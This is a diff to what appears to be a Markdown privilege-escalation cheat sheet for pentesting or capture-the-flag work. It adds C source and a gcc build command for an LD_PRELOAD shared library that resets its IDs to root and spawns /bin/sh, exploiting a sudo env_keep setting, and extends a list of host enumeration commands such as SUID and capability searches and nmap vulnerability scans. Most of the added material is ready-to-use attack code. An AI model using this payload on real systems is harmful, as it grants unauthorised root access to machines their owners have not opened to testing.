@@ -111,6 +111,25 @@ chmod +x rev
 ```
 </details>
 
+<details><summary>env_keep += LD_PRELOAD</summary>
+
+```
+cat > shell.c << EOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+EOF
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+</details>
+
 #### information gathering
 ```bash
 cat /proc/version
@@ -123,12 +142,14 @@ ip route
 uname -a
 netstat # -at -l -t -tp -i
 netstat -tupln | grep LISTEN
+ss -atur
 find / -writable 2>/dev/null
 find / -mtime 10 #find files that were modified in the last 10 days
 find . -name flag.txt
 find / -type d -name config #find the directory named config under “/”
 find / -type f -user <user> 2>/dev/null #find files owned by user
 find / -type f -perm /4000 2>/dev/null
+find / -type f -group <group> -exec ls -l {} + 2>/dev/null
 getcap -r / 2>/dev/null
 cat /etc/exports #file sharing
 nmap --script=vuln <ip>
